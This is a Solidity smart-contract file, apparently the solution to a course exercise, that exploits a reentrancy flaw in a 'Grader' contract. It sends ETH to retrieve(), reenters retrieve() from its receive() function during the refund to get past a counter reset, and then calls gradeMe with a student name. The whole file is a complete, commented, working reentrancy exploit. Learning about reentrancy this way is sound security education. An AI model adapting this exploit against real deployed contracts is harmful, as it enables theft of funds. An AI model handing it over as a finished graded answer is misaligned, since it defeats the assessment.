// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

contract HackModule5 {
    /// @notice Target contract address vulnerable to reentrancy
    address public immutable grader;
    /// @dev Internal flag to ensure only a single reentrant call during attack execution
    bool internal hasReentered;

    /**
     * @notice Initializes the attack contract with the address of the target contract.
     * @param _grader The address of the vulnerable `Grader` contract to exploit.
     */
    constructor(address _grader) payable {
        grader = _grader;
    }

    /**
     * @notice Executes the full exploit in a single transaction.
     *         - Calls `retrieve()` with enough ETH
     *         - Reenters during the ETH refund via `receive()`
     *         - Calls `gradeMe(name)` once the internal counter is correctly incremented
     * @param name The student name to be submitted via `gradeMe()`
     */
    function attack(string calldata name) external payable {
        require(msg.value >= 4, "Need at least 4 wei to call retrieve()");
        hasReentered = false;

        // call to retrieve method
        (bool retrieved, ) = grader.call{value: msg.value}(
            abi.encodeWithSignature("retrieve()")
        );
        require(retrieved, "First call to retrieve() failed");

        // call gradeMe method
        (bool graded, ) = grader.call(
            abi.encodeWithSignature("gradeMe(string)", name)
        );
        require(graded, "gradeMe failed");
    }

    /**
     * @notice Triggered when the target contract sends 1 wei during the `retrieve()` refund logic.
     * @dev Performs a reentrant call back into `retrieve()`, bypassing the counter reset condition.
     *      Ensures reentrancy occurs only once using the `hasReentered` flag.
     */
    receive() external payable {
        if (!hasReentered) {
            hasReentered = true;
            
            // Reentrance
            (bool ok, ) = grader.call{value: 4} (
                abi.encodeWithSignature("retrieve()")
            );
            require(ok, "Reentrant retrieve() failed");
        }
    }
}